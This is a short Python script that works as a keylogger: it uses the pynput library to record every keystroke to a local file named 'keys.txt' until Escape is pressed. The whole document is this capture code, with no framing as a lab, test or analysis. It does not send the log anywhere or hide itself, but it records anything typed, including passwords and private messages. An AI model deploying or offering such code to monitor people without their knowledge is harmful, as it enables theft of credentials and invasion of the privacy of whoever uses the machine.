log_file = "keys.txt"
open(log_file, "w").close()

from pynput import keyboard

log_file = "keys.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
